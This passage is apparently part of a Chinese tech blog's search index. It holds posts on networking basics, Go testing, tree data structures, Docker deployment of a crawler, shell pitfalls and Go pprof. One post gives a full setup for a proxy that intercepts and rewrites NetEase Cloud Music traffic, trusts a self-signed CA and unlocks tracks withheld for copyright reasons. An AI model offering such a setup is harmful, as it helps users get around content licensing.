回送请求和回答 \n    + ping 命令, 不通过 tcp 和 udp  \n    +  tracert 命令, 用来看经过哪些路由器\n  + 时间戳请求和回答\n\n\n\n# 10. 虚拟专用网vpn和 网络地址转换NAT\n\n### 10.1 私有地址\n\n+ 10.0.0.0/8\n+ 172.16.0.0/12\n+ 192.168.0.0/16\n\n### 10.2 不同局域网间的发送\n\n+ 路由器不转发私有地址\n\n+ 所以对内部 IP数据报, 进行加密, 再次套一个首部, 写上公网地址\n+ 又叫 IP 隧道技术\n\n### 10.3 NAT\n\n+ 路由器上安装 NAT 软件\n+ 到路由器的时候,转换全球地址, 记录在路由器的 NAT转换表里\n+ NAPT路由器, 将端口号和 IP 地址一起转换\n+ NAT, 外网不能主动发起到内网的主机, 内网主机不能充当服务器, 如果可以,就要特殊穿透技术\n\n> # 运输层\n\n# 11. 运输层\n\n### 11.1 端口号  0-65535\n\n+ 熟知端口号 0-1023 个人不能用\n+ 登记端口号 1024-49151 也得IANA登记\n+ 短暂端口号 49152-65535 \n\n### 11.2 发送复用和接收分用\n\n![1](计算机网络简明教程/5.png)\n\n\n\n> # 数据链路层\n\n# 12. 数据链路层\n\n#### 12.1 封装成帧\n\n添加帧头, 添加帧尾来标志\n\n如果数据里面有帧的定界标志, 就对数据进行一个转义, 否则会认为错误的结束位置\n\n帧的最大数据长度有限制, 叫做 MTU\n\n#### 12.2 差错检测\n\n![1](计算机网络简明教程/6.png)\n\n\n\n+ 奇偶校验\n  + 在数据后面添加1位奇偶校验位, 使1的个数为奇数或偶数\n  + 不靠谱, 一半的失误率\n\n+ CRC 校验\n\n  ![1](计算机网络简明教程/7.png)\n\n  ![1](计算机网络简明教程/8.png)\n\n#### 12.3 可靠传输\n\n+ 一般链路层在有线以太网不实现可靠传输, 无线局域网信号差, 实现可靠传输\n\n+ 停止等待协议SW\n\n  + 信道利用率特别低\n\n    ![1](计算机网络简明教程/9.png)\n\n\n+ 回退 N 帧协议GBN \n\n  + 通过发送窗口发送, 累计确认增大效率\n  + 但是发送5个, 第1个出错, 会连累剩下的4个, 造成5个都需要重传, 差的情况下效率也不高\n  + 接收窗口只能是1\n\n\n+ 选择重传协议SR\n\n  + 接收窗口大于1, 有了缓存\n  + 不能累计确认,只能逐一确认\n\n\n\n# 13 数据链路层协议\n\n#### 13.1 点对点协议 PPP\n\n不提供可靠传输服务\n\n\n\n> # 应用层\n\n# 20. DHCP \n\ndhcp 服务端口udp 68,  客户端 udp 67\n\ndhcp 服务器, 一般集成在路由器里\n\n客户通过 dhcp 客户端向 dhcp 服务器请求, 得到 IP租用, 时间过了一半后,重新发送租用请求\n\n在使用的时候需要用 arp 请求确定 ip 未被占用","tags":["网络"],"categories":["网络"]},{"title":"golang测试单个文件或函数","url":"%2Fp%2F401250d7.html","content":"\n### 1. 测试单个文件或函数\n\n测试一个文件\n\n```bash\ngo test -v hello_test.go\n```\n\n\n\n测试一个函数\n\n```bash\ngo test -v  -test.run=\"TestA\"  \n```\n\n<!-- more -->\n\n注意在测试单个文件时, 会出现未定义的情况, 这是因为定义在其他文件里, 需要加上定义的文件.\n\n```bash\ngo test -v hello.go hello_test.go\n```\n\n\n\n而测试单个函数不存在这个问题, 可以在一个文件内用相同的前缀命名测试函数, 然后用正则表达式去测试.\n\n如:\n\n```bash\ngo test -v  -test.run=\"TestA*\"  \n```\n\n\n\n### 2. 测试覆盖率\n\n```bash\ngo test -v -coverprofile=a.out -test.run=\"TestA*\" # 把测试结果保存在 a.out\n\ngo tool cover -html=./a.out  # 通过浏览器打开, 可以看到覆盖经过的函数\n```\n\n\n\n### 3. 总结\n\n不写单元测试的代码都是耍流氓.","tags":["golang"],"categories":["golang"]},{"title":"解锁网易云音乐灰色歌曲并试听","url":"%2Fp%2F3a9129d9.html","content":"\n\n\n### 0. 前言\n\n谈起音乐软件, 只钟情网易云音乐. 奈何版权太少, 歌单里好多音乐涉及到版权的问题无法听, 即使开了VIP也不行.\n\n但是我们可以通过一些“奇淫技巧”来实现解锁灰色无版权歌曲，效果比开了黑胶VIP 还要强大.\n\n声明：本工具只提供大家免费测试学习使用，请勿用作任何商业用途。\n\n<!-- more -->\n\n### 1. 项目介绍\n\nhttps://github.com/nondanee/UnblockNeteaseMusic\n\n其原理是通过流量进入代理后来匹配网易链接进行劫持，然后将requests请求修改重新发送一个新的链接（这个链接就是provider的），请求到音乐以后再重新将provider的response改写成网易的，然后返回到应用，通俗的说是修改http请求和响应。\n\n整个配置参考了这个项目,  唯一不足的是教程散落在仓库的各大 issue. 因为只常用 ios 和 mac 的设备,所以只测试了这两个平台, 上测试效果图:\n\n![1](解锁网易云音乐灰色歌曲并试听/2.jpg)\n\n![2](解锁网易云音乐灰色歌曲并试听/1.jpg)\n\n\n\n\n\n### 2. 配置\n\n把项目下载到云服务器上, 直接 node app.js 即可运行. 因为 ios 和 mac 平台的特殊性, 需要加一些参数,参考下面配置.\n\n\n\n##### 2.1 先给域名加个解析\n\n我这里给 music.liuvv.com 解析到云服务器ip\n\n\n\n##### 2.2 启动systemctl 配置\n\n ```\n[Unit]\nDescription=music\nAfter=network.target\n[Service]\nExecStart=/usr/bin/node /opt/UnblockNeteaseMusic/app.js -e https://music.liuvv.com -s -p 8080:8081\nRestart=always\nRestartSec=5\n[Install]\nWantedBy=default.target\n ```\n\n这里启动的参数格式是 node app.js -e 域名 -s -p  http端口:https端口\n\n\n\n##### 2.2 nginx 配置\n\n```nginx\nserver {\n  listen 443;\n  server_name music.liuvv.com; # 改为自己的域名\n\n  ssl on;\n  ssl_certificate /etc/nginx/ssl/music/cert.pem; # 改为自己申请得到的 crt 文件的名称\n  ssl_certificate_key /etc/nginx/ssl/music/key.pem; # 改为自己申请得到的 key 文件的名称\n  ssl_session_timeout 5m;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;\n  ssl_prefer_server_ciphers on;\n\n  location / {\n    proxy_pass http://localhost:8080; # 转发\n  }\n}\n```\n\n\n\n这里`ssl_certificate`和`ssl_certificate_key` 需要用 acme.sh 生成证书.\n\n https://github.com/acmesh-official/acme.sh\n\n```bash\nacme.sh --installcert -d music.liuvv.com \\ \n--key-file       /etc/nginx/ssl/music/key.pem  \\ \n--fullchain-file /etc/nginx/ssl/music/cert.pem \n```\n\n\n\n### 3. ios 使用\n\n教程散落在这个 issue  https://github.com/nondanee/UnblockNeteaseMusic/issues/65\n\n+ 去美区 appstore, 下载个小火箭\n\n- 右上角加号添加节点\n- 类型选择 HTTP\n- 服务器填写你的服务器公网 IP\n- 端口填写你启动服务的端口号（默认为 8080）\n- 然后底部找到配置 点击本地文件 -> default.conf -> 编辑配置\n- 添加三条规则 选项选择你刚刚添加的节点\n  - `USER-AGENT`: `NeteaseMusic*`\n  - `DOMAIN-SUFFIX`: `163.com`\n  - `DOMAIN-SUFFIX`: `126.net`\n\n+ 打开网易云, 搜索周杰伦\n\n\n\n### 4. mac 使用\n\nmac 因为最新版本的原因(我的版本2.3.2 (832)),  需要通过自签证书解决https 请求.\n\n教程散落在这个 issue https://github.com/nondanee/UnblockNeteaseMusic/issues/48\n\n\n\n+ 安装仓库内的 CA证书到系统钥匙链, 并始终信任. \n+ 在系统偏好设置里, 网络->代理->自动代理配置里, 填写 url  `http://公网ip:8080/proxy.pac`\n+ 打开网易云, 搜索周杰伦\n\n\n\n### 5. windows使用\n\nwindows 和 ios 不通用, 可以开启两个进程, 监听不同的端口\n\nhttps://github.com/nondanee/UnblockNeteaseMusic/issues/478\n\n\n\n### 6. 一边科学上网一边\n\n在 mac下, 虽然可以通过系统代理达到目的, 但还是建议走代理软件. \n\n我用的是 clashX, 先上 mac 的 clashX 配置\n\n```yaml\nport: 7890\nsocks-port: 7891\nallow-lan: false\nmode: Rule\nlog-level: silent\nexternal-controller: 127.0.0.1:9090\n\ndns:\n  enable: true\n  listen: 0.0.0.0:53\n  enhanced-mode: fake-ip\n  nameserver:\n   - 119.29.29.29\n   - 223.5.5.5\n\nProxy:\n- name: \"UnblockMusic\"\n  type: http\n  server: 公网ip\n  port: 8080\n\nProxy Group:\n- name: \"Netease Music\"\n  type: select\n  proxies: \n    - UnblockMusic\n    - DIRECT\n\nRule:\n# Unblock Netease Music\n- DOMAIN,api.iplay.163.com,Netease Music\n- DOMAIN,apm3.music.163.com,Netease Music\n- DOMAIN,apm.music.163.com,Netease Music\n- DOMAIN,interface3.music.163.com,Netease Music\n- DOMAIN,interface.music.163.com,Netease Music\n- DOMAIN,music.163.com,Netease Music\n- DOMAIN,music.126.net,Netease Music\n- DOMAIN-SUFFIX,163yun.com,Netease Music\n- DOMAIN-SUFFIX,mam.netease.com,Netease Music\n- DOMAIN-SUFFIX,hz.netease.com,Netease Music\n\n# CIDR规则\n- IP-CIDR,39.105.63.80/32,Netease Music\n- IP-CIDR,45.254.48.1/32,Netease Music\n- IP-CIDR,47.100.127.239/32,Netease Music\n- IP-CIDR,59.111.160.195/32,Netease Music\n- IP-CIDR,59.111.160.197/32,Netease Music\n- IP-CIDR,59.111.181.35/32,Netease Music\n- IP-CIDR,59.111.181.38/32,Netease Music\n- IP-CIDR,59.111.181.60/32,Netease Music\n- IP-CIDR,101.71.154.241/32,Netease Music\n- IP-CIDR,103.126.92.132/32,Netease Music\n- IP-CIDR,103.126.92.133/32,Netease Music\n- IP-CIDR,112.13.119.17/32,Netease Music\n- IP-CIDR,112.13.122.1/32,Netease Music\n- IP-CIDR,115.236.118.33/32,Netease Music\n- IP-CIDR,115.236.121.1/32,Netease Music\n- IP-CIDR,118.24.63.156/32,Netease Music\n- IP-CIDR,193.112.159.225/32,Netease Music\n- IP-CIDR,223.252.199.66/32,Netease Music\n- IP-CIDR,223.252.199.67/32,Netease Music\n- IP-CIDR,59.111.21.14/31,Netease Music\n- IP-CIDR,59.111.179.214/32,Netease Music\n- IP-CIDR,59.111.238.29/32,Netease Music\n\n# Advertising\n- DOMAIN,admusicpic.music.126.net,REJECT\n- DOMAIN,iadmat.nosdn.127.net,REJECT\n- DOMAIN,iadmusicmat.music.126.net,REJECT\n- DOMAIN,iadmusicmatvideo.music.126.net,REJECT\n\n# Final\n- MATCH,DIRECT\n```\n\n启动这个配置再打开网易云, 加载速度就会特别丝滑. \n\n但是大多数情况下需要一边科学上网一边听歌, 所以只需要把上面这个 Rule 规则合并你翻墙的规则里即可. 因为有规则优先级的顺序问题, 需要把上述 Rule 配置放到自己的 Rule 配置前面.\n\n\n\n### 7. 参考资料\n\n+ https://github.com/nondanee/UnblockNeteaseMusic\n+ https://www.yfriend.xyz/155.html","tags":["音乐"],"categories":["音乐"]},{"title":"树的介绍和分类","url":"%2Fp%2Fd354593e.html","content":"\n# 1. 树\n\n在自然界和日常生活中，可以见到很多情形可以归结为树结构。如：家族谱系、行政管理机构、Windows磁盘文件管理系统等。\n\n自然界的树是树根朝下，枝干和叶子向上生长，而我们讨论的树在生长方向上正好与其相反，它是倒长的树，即根朝上，枝干和叶子朝下。\n\n<!-- more -->\n\n### 1.1 定义\n\n树（Tree）是n（n≥0）个结点的有限集合。它满足：\n（1）仅有一个特定的结点，称为根（root）结点;\n（2）其余结点分为m(m≥0)个互不相交的非空有限集合   其中每个集合自身又是一棵树，称为根的子树（subtree）。\n\n本条即是说，树结点之间的路径不能形成回路，否则称为图\n\n+ 为了表述方便，把没有结点的树称为空树。\n+ 树的定义具有递归性：即一棵树是由根及若干棵子树构成的，而子树又是由根及若干棵子树构成的。\n\n### 1.2 树的基本术语\n\n+ 结点的度（degree）(就是直接的孩子有几个)\n\n  结点所拥有的子树的个数称为该结点的度，而树中各结点的度的最大值称为该树的度。\n\n  \n\n+ 叶子（leaf）结点和分支结点  (没有孩子的节点就是叶子节点)\n  + 度为0的结点称为叶子（终端）结点；度不为0的结点称为分支（非终端）结点。\n  \n  + 一棵树除了叶子结点就是分支节点。\n  \n    \n  \n+ 孩子结点、双亲结点、兄弟及堂兄弟结点 \n\n  + 树中一个结点的子树的根（或说后继）称为该结点的孩子，该结点称为其孩子结点的双亲结点。\n  + 同一个双亲的孩子结点互称为兄弟。双亲在同一层的结点互为堂兄弟。\n\n\n\n+ 祖先和子孙\n  + 祖先是从根到该所经分支上的所有结点。反之，以某结点为根的子树中的任一结点称为该结点的子孙。\n  + 显然祖先和子孙关系是父子关系的延伸。\n\n\n\n+ 结点的层数（level）和树的深度(depth，或称高度height）\n  + 结点的层次从根结点开始算起，根结点的层数为1，其余结点的层数等于其双亲结点的层数加1。比如，如果某个结点的层数为h，则其子树就在第h+1层。\n  + 树中各个结点层数的最大值称为树的深度（高度）。\n\n\n\n+ 有序树（ordered tree）和无序树（unordered tree）\n\n  若一棵树中结点的各子树从左到右是有次序的，即若交换了某结点各子树的相对位置就构成不同的树，则称这棵树为有序树，否则称为无序树。\n\n\n\n+ 路径（path）\n\n  从树中的一个结点到另一个结点的路途（路径只能由上向下，不能横向或由下向上）\n\n\n\n+ 森林（forest）\n\n  m（m≥0）棵互不相交的树的集合\n\n  \n\n\n\n# 2. 二叉树\n\n一般的树规律性差，二叉树结构简单，存储和处理相对容易，而且一般的树可以转化为二叉树处理。\n\n### 2.1 二叉树的定义\n\n+ 二叉树是n（n≥0）个结点的有限集合，除了空树（n=0）之外，由一个根结点及两棵不相交的左子树和右子树组成；\n\n+ 二叉树每个结点的度数≤2；\n\n+ 二叉树的定义是递归的。\n\n二叉树有五种基本形态：\n\n(1)空树\n\n(2)只有根结点\n\n(3)只有左子树\n\n(4)只有右子树\n\n(5)完整二叉树\n\n注意：二叉树的子树一定要分出左右，否则不能称作二叉树。\n\n### 2.2 二叉树的性质\n\n+ 二叉树的第i层的结点数量最多为 2<sup>i-1 </sup> (i >= 1)\n\n  + 1层 最多1\n\n  + 2层 最多2\n\n  + 3层 最多4\n\n    \n\n+ 深度为k的二叉树结点数目最多为 2<sup>k</sup> -1 (k >= 1)\n\n  + 深1层 最多1\n\n  + 深2层 最多3\n\n  + 深3层 最多7\n\n    \n\n+ 在任意二叉树中，若叶子结点数为n0，度数为2的结点数为n2，则有n0=n2+1\n\n  本性质是说，任意一颗二叉树，叶子结点比度数为2的结点的个数多一个。\n\n  ​     1\n\n    1     1\n\n  11    11 \n\n  叶子节点4个, 度数为2的是3个\n\n\n\n\n### 2.3 二叉树存储(先变成完全二叉树)\n\n二叉树的形状可能繁多且不固定，不好掌握规律，而进行顺序存储恰恰相反，要求规律性强。所以这种存储一定是规律性较强的二叉树才适合。完全二叉树符合这一点，这也是它被定义的原因之一。\n\n对于完全二叉树进行结点编号（自上而下，自左至右）后，编号可以反映结点的分支和从属关系，将这些结点存入一维数组时，编号和数组下标可以对应起来。\n\n对于一般的二叉树，不易直接采用顺序存储，可以虚补成完全二叉树后再用顺序存储的方法存储。\n\n\n\n然后数组的每个节点结构可以如下:\n\n```c\ntypedef struct node\n{\n DataType data;\n struct node *lchild,*parents,*rchild;\n}ThTree;\n```\n\n\n\n### 2.4 二叉树遍历\n\n+ 先序遍历：**根**，左子树，右子树   \n\n+ 中序遍历：左子树，**根**，右子树  \n\n+ 后序遍历：左子树，右子树，**根**\n\n  \n\n中序更重要, 只有中序和其他一个序组合,就能还原二叉树\n\n\n\n# 3. 二叉树的种类\n\n### 3.1 满二叉树(就是节点全满了)\n\n满二叉树的定义：深度为k（k≥1）且结点数为 2<sup>k</sup> -1的二叉树。\n\n满二叉树的结点数达到最大值。\n\n\n\n### 3.2 完全二叉树(除最后一层都是满的,因为数量不可能正好满二叉树,常用)\n\n对于满二叉树的结点，按下列规则编号：\n(1)从根结点开始，自上而下；\n(2)同一层自左至右。\n\n+ 满二叉树的结点编号后，任意取满二叉树的前若干个连续的结点所对应的二叉树，称为完全二叉树。\n\n+ 完全二叉树的特点：除最后一层外，其余各层均是满的，最后一层，结点连续出现在左边。\n\n请注意：满二叉树要求太特殊且严格，一般不容易满足，而完全二叉树条件低一些，容易满足，今后会经常用到它，所以要注意它。\n\n\n\n### 3.3 二叉查找树（英语：Binary Search Tree，简写为BST）\n\n也称 **二叉搜索树**、**有序二叉树**（英语：ordered binary tree），**排序二叉树**（英语：sorted binary tree）不一定是完全二叉树\n\n是指一棵空树或者具有下列性质的二叉树：\n\n+ 若任意节点的左子树不空，则左子树上所有结点的值均小于它的根结点的值；\n\n+ 若任意节点的右子树不空，则右子树上所有结点的值均大于它的根结点的值；\n\n+ 任意节点的左、右子树也分别为二叉查找树；\n\n+ 没有键值相等的节点。\n\n简单的说就是：各节点值不同，并且对于任意一个子树：左<根<右。\n\n\n\n##### 3.3.1 算法复杂度\n\n+ 算法查找时间依赖于树的拓扑结构。最佳情况是 O(log­2n)，而最坏情况是 O(n)。\n\n+ 插入算法的复杂度与查找算法的复杂度是一样的：最佳情况是 O(log­2n)，而最坏情况是 O(n)。\n\n  如何插入值相等直接丢弃或抛出异常\n\n+ 删除算法的运行时间也与 BST 的拓扑结构有关，最佳情况是 O(log­2n)，而最坏情况是 O(n)。\n\n  删除一个非叶子节点，就必须选择其他节点来填补因删除节点所造成的树的断裂。\n\n\n\n### 3.4 平衡二叉树\n\n平衡二叉树的提出就是为了保证树不至于太倾斜，尽量保证两边平衡。因此它的定义如下：\n\n1. 平衡二叉树要么是一棵空树\n2. 要么保证左右子树的高度之差不大于 1\n3. 子树也必须是一颗平衡二叉树\n\n这种形态就是平衡，会使查找速度更快。为什么能够保持这种好身材呢？通过在新增/删除时的旋转（`左旋和右旋`）。\n\n\n\n##### 3.4.1 平衡调整\n\n1. 找平衡因子 = 2\n\n2. 找插入新节点后失去平衡的最小子树\n\n   + 距离插入点最近\n   + 平衡因子绝对值大于1的结点作为根\n   + 确认调整的点:     先确定根 -> 对插入的新节点, 路上的3个点\n\n3. 平衡调整, 有四种类型\n\n   + LL-> R \t\n\n     中为支点, 高右旋\n\n   + RR -> L\n\n     中为支点, 高左旋\n   \n   + LR -> LR\n   \n     下二整体先左转, 变成 LL 再右转\n   \n   + RL -> RL\n   \n     下二整体先右转, 变成 RR 再左转\n\n\n\n##### 3.4.2 常见的平衡树：\n\n[AVL树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/AVL树)、[Treap](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/Treap)、[伸展树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/伸展树)、[红黑树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/红黑树)、[加权平衡树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/加权平衡树)、[2-3树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/2-3树)、[AA树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/AA树)、[替罪羊树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/替罪羊树)、节点大小平衡树\n\n\n\n### 3.5 红黑树（Red–black tree)\n\n红黑树是一种含有红黑结点并能自平衡的二叉查找树。它必须满足下面性质：\n\n+ 性质1：每个节点要么是黑色，要么是红色。\n+ 性质2：根节点是黑色。每个叶子节点（NIL）是黑色。\n+ 性质3：树中不存在两个相邻的红色结点（即红色结点的父结点和孩子结点均不能是红色）\n+ 性质4：从任意一个结点（包括根结点）到其任何后代 NULL 结点（默认是黑色的）的每条路径都具有相同数量的黑色结点。\n\n\n\n![1](树的介绍和分类/1.png)\n\n\n\n##### 为什么要有红黑树？\n\n大多数二叉排序树BST的操作（查找、最大值、最小值、插入、删除等等）都是 的时间复杂度，h 为树的高度。但是对于斜树而言（BST极端情况下出现），BST的这些操作的时间复杂度将达到 。为了保证BST的所有操作的时间复杂度的上限为 ，就要想办法把一颗BST树的高度一直维持在 ，而红黑树就做到了这一点，红黑树的高度始终都维持在 ，n 为树中的顶点数目.\n\n##### 红黑树RBT与平衡二叉树AVL比较：\n\nAVL 树比红黑树更加平衡，但AVL树在插入和删除的时候也会存在大量的旋转操作。所以当你的应用涉及到频繁的插入和删除操作，切记放弃AVL树，选择性能更好的红黑树；当然，如果你的应用中涉及的插入和删除操作并不频繁，而是查找操作相对更频繁，那么就优先选择 AVL 树进行实现。\n\n\n\n# 4. 其他种类的树\n\n### 4.1 哈夫曼树(霍夫曼树)\n\n带权的树,  加起来 WPL 最小, 可用来压缩\n\n\n\n### 4.2 B树(B-树)\n\nN叉的排序树\n\n+ 结点最多含有m 颗子树，m-1个关键字（数据）（m>=2）\n+ 若根节点不是叶子节点，则至少有两颗子树。\n\n不满足，就分裂，从中间分开，分成两颗子树\n\n+ 除根节点和叶子节点外，其他每个节点至少有ceil(m/2)个子节点（子树）。2.1=>3, 2.7=>3\n\n\n\n### 4.3 B+树 \n\n##### 4.3.1 数据库为什么不用红黑树\n\n+ 树太高，读取次数过多\n+ 读取浪费太多，不连续\n\n##### 4.3.2 和 B 树的区别\n\n+ 叶子节点连起来了 双向链表（方便范围查找）\n\n+ 非叶子节点不存数据，数据都存在叶子节点\n\n  \n\n# 5. 头脑风暴\n\n### 5.1 左旋右旋\n\n+ 左旋\n\n  父亲掉下去，右儿子上去，为了上去，儿子割左腿补偿给父亲右腿\n\n+ 右旋\n\n  父亲掉下去，左儿子上去，为了上去，儿子割右腿补偿给父亲左腿\n\n  \n\n# 6. 参考资料\n\n+ https://www.jianshu.com/p/a826ab614e4a\n\n+ [二叉查找树](https://www.cnblogs.com/gaochundong/p/binary_search_tree.html)\n\n+ [为什么mysql索引要使用B+树，而不是B树，红黑树](https://segmentfault.com/a/1190000021488885)\n\n  \n\n","tags":["算法"],"categories":["数据结构"]},{"title":"python爬虫项目在docker中的部署实践","url":"%2Fp%2Fdc81a411.html","content":"\n\n\n### 1. 选择镜像\n\n这里选择基础镜像时是有讲究. 一是应当尽量选择官方镜像库里的基础镜像；二是应当选择轻量级的镜像做底包.\n\n就典型的 Linux 基础镜像来说，大小关系如下：Ubuntu > CentOS > Debian> Alpine\n\nAlpine Docker 镜像也继承了 Alpine Linux 发行版的这些优势。相比于其他 Docker 镜像，它的容量非常小，仅仅只有 5 MB 左右（对比 Ubuntu 系列镜像接近 200 MB），且拥有非常友好的包管理机制apk。\n\n<!-- more -->\n\n### 2. 拷贝文件\n\n相对于 ADD,优先使用 COPY指令\n\n另外发现拷贝文件夹是把文件夹的内容拷贝进去, 而不是把整个目录拷贝进去, 坑爹 最后使用dockerignore解决这个问题.\n\n```dockerfile\ncopy . /zk8/\n```\n\n.dockerignore文件\n\n```\nchromedriver\n*.sh\n.*\n**/__pycache__/\nDockerfile\n```\n\n\n\n### 3. 测试 dockerfile\n\n##### 3.1 镜像加速\n\n在本地测试的时候, 发现连Alpine都拉取不下来, 此处感谢伟大的 great wall. 于是选择阿里云加速.\n\nhttps://cr.console.aliyun.com/cn-hangzhou/instances/mirrors\n\n右键点击桌面顶栏的 docker 图标，选择 Preferences ，在 Daemon 标签（Docker 17.03 之前版本为 Advanced 标签）下的 Registry mirrors 列表中\n\n将 https://xxxxxxxxx.mirror.aliyuncs.com 加到 \"registry-mirrors\" 的数组里，点击Apply & Restart 按钮，等待 Docker 重启并应用配置的镜像加速器。\n\nps: 就是阿里云加速, 在后续的安装软件中也是特别慢, 此处建议在云服务器上(免费的谷歌云)操作.\n\n##### 3.2 测试\n\n```bash\ndocker build -t zk8:0.1 .   #  制作 image\ndocker run -ti --rm zk8:0.1 /bin/sh   # 启动容器结束后删除, 用这种方法可以非常方便测试\n```\n\n前期可以通过 shell 进入到容器里面测试, 在里面尝试安装相应的软件包, 然后再写 dockerfile会比较方便\n\n\n\n### 4. 安装软件包\n\n爬虫用 python 写的, 并且使用了 selenium + 无头浏览器. 所以安装包要写在 dockerfile里, 文件如下:\n\n```dockerfile\nFROM alpine\n\nRUN mkdir -p /zk8\nCOPY . /zk8/\n\n# install python\nRUN echo \"**** install python ****\" && \\\n                apk add --no-cache python3 && \\\n                if [ ! -e /usr/bin/python ]; then ln -sf python3 /usr/bin/python ; fi && \\\n                echo \"**** install pip ****\" && \\\n                python3 -m ensurepip && \\\n                rm -r /usr/lib/python*/ensurepip && \\\n                pip3 install --no-cache --upgrade pip setuptools wheel && \\\n                if [ ! -e /usr/bin/pip ]; then ln -s pip3 /usr/bin/pip ; fi\n\n# install python package\nRUN apk add --no-cache py-lxml && \\\n                apk add --no-cache chromium && \\\n                apk add --no-cache chromium-chromedriver && \\\n                if [ -e /usr/bin/chromedriver ]; then ln -s /usr/bin/chromedriver /zk8/chromedriver ; fi && \\\n                pip install selenium && \\\n                pip install bearychat && \\\n                pip install pyquery\n\n\nWORKDIR /zk8\nCMD python3 main.py\n```\n\n\n\n### 5. 发布到 dockerhub\n\n建议建立自己的私有仓库, 因为 dockerhub 可以免费使用一个私有仓库, 此处上传到 dockerhub.\n\n```bash\ndocker login # 登录自己的 dockerhub 帐号\n\ndocker tag zk8:0.1 levonfly/zk8:0.1 # 此处打 tag, 格式要以 用户名/镜像名字:版本号\n\ndocker push levonfly/zk8:0.1 # 推送到 dockerhub\n```\n\ndockerhub 上还可以 link 到github, 即 github 一更新代码就重新 build.\n\n接下来就是激动人心的时刻, 在任何安装 docker 的机器上直接运行自己的爬虫.\n\n```bash\ndocker pull levonfly/zk8:0.1\ndocker run -d --name zk8 levonfly/zk8:0.1 \n```\n\n\n\n\n\n","tags":["docker"],"categories":["docker"]},{"title":"shell读取文件内容遇到的坑","url":"%2Fp%2F67723314.html","content":"\n文件内容如下, 需要把1234读取赋值给shell内部的变量nodeid\n\n```\ncat a.conf\nnodeid 1234\n```\n\n<!-- more -->\n\nshell解析文件如下\n\n```shell\n#!/bin/sh\n\nnodeid=0\n\n\nset_nodeid1(){\n\tcat a.conf | while read line\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone\n}\n\nset_nodeid2(){\n\tfor line in `cat a.conf`\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone\n}\n\nset_nodeid3(){\n\twhile read -r line\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone < a.conf\n}\n\n\nset_nodeid1\necho \"set_nodeid1 is $nodeid\"\nset_nodeid2\necho \"set_nodeid2 is $nodeid\"\nset_nodeid3\necho \"set_nodeid3 is $nodeid\"\n```\n\n\n\n输出内容如下:\n\n```bash\nset_nodeid1 is 0\nset_nodeid2 is\nset_nodeid3 is 1234\n```\n\n\n\n第一种方式创建了子shell, 赋值是子shell的, 没有影响到全局变量.\n\n第二种方式, for循环的方式, 因为a.conf中间空格导致的,把一行循环了两次, 所以赋值了空\n\n第三种方式得到正确的结果\n\n","tags":["shell"],"categories":["shell"]},{"title":"golang的pprof使用","url":"%2Fp%2F771638a0.html","content":"\n# 1. quick start\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t_ \"net/http/pprof\"\n)\n\nfunc main() {\n\tlog.Println(http.ListenAndServe(\"localhost:6060\", nil))\n}\n\n```\n\n<!-- more -->\n\n打开浏览器, 输入 `http://localhost:6060/debug/pprof/`, 内容显示如下:\n\n```bash\n/debug/pprof/\n\nTypes of profiles available:\nCount\tProfile\n1\tallocs # 内存分配情况的采样信息\n0\tblock\t # 阻塞操作情况的采样信息\n0\tcmdline #\t显示程序启动命令及参数\n4\tgoroutine # 当前所有协程的堆栈信息\n1\theap # 堆上内存使用情况的采样信息\n0\tmutex # 锁争用情况的采样信息\n0\tprofile # CPU 占用情况的采样信息\n5\tthreadcreate # 系统线程创建情况的采样信息\n0\ttrace # 程序运行跟踪信息\nfull goroutine stack dump\n```\n\n上面每一个都是一个超链接, 可以点进去, 看到堆栈信息\n\n\n\n# 2. 命令查看\n\n+ mac需要安装graphviz\n\n    ```bash\n    brew install graphviz\n    # 如果一直下载不成功, 修改brew源\n    ```\n    \n+ 查看内存使用情况\n\n  ```bash\n  go tool pprof http://localhost:6060/debug/pprof/heap\n  # 进入如下gdb交互模式:\n  \n  # top 查看前10个的内存分配情况\n  (pprof) top\n  Showing nodes accounting for 1.16MB, 100% of 1.16MB total\n        flat  flat%   sum%        cum   cum%\n      1.16MB   100%   100%     1.16MB   100%  runtime/pprof.writeGoroutineStacks\n           0     0%   100%     1.16MB   100%  net/http.(*ServeMux).ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http.(*conn).serve\n           0     0%   100%     1.16MB   100%  net/http.HandlerFunc.ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http.serverHandler.ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http/pprof.Index\n           0     0%   100%     1.16MB   100%  net/http/pprof.handler.ServeHTTP\n           0     0%   100%     1.16MB   100%  runtime/pprof.(*Profile).WriteTo\n           0     0%   100%     1.16MB   100%  runtime/pprof.writeGoroutine\n           \n           \n  # tree 以树状显示\n  (pprof) tree\n  Showing nodes accounting for 1.16MB, 100% of 1.16MB total\n  ----------------------------------------------------------+-------------\n        flat  flat%   sum%        cum   cum%   calls calls% + context\n  ----------------------------------------------------------+-------------\n                                              1.16MB   100% |   runtime/pprof.writeGoroutine\n      1.16MB   100%   100%     1.16MB   100%                | runtime/pprof.writeGoroutineStacks\n      \n      \n  # png 以图片格式输出,在当前目录下\n  (pprof) png\n  Generating report in profile001.png\n  \n  # svg 生成浏览器可以识别的svg文件,在当前目录下, 直接点开在浏览器查看\n  (pprof) png\n  Generating report in profile001.png\n  ```\n  \n  \n  \n  | 列名  | 含义                                                         |\n  | ----- | ------------------------------------------------------------ |\n  | flat  | 本函数的执行耗时                                             |\n  | flat% | flat 占 CPU 总时间的比例。程序总耗时 16.22s, Eat 的 16.19s 占了 99.82% |\n  | sum%  | 